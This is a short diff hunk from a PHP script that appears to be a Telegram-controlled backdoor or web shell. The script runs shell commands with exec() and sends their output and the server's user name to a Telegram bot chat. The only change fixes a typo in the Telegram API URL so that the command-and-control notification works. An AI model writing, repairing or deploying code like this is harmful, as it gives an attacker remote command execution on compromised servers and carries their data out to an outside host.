@@ -55,7 +55,7 @@
 						array_pop($spl);
 						exec(join(" ",$spl) . " 2>&1", $output);
 						$output = join("\n",$output);
-						file_get_contents('https://api.t]elegram.org/bot' . $token . '/sendMessage?text=' . urlencode("✔️ Command Executed \n-- " . get_current_user() . "--") . '&chat_id=' . $chat_id);
+						file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("✔️ Command Executed \n-- " . get_current_user() . "--") . '&chat_id=' . $chat_id);
 						if($output != ""){
 							file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("📌 Output : \n" . $output . "\n--" . get_current_user() . "--") . '&chat_id=' . $chat_id);
 
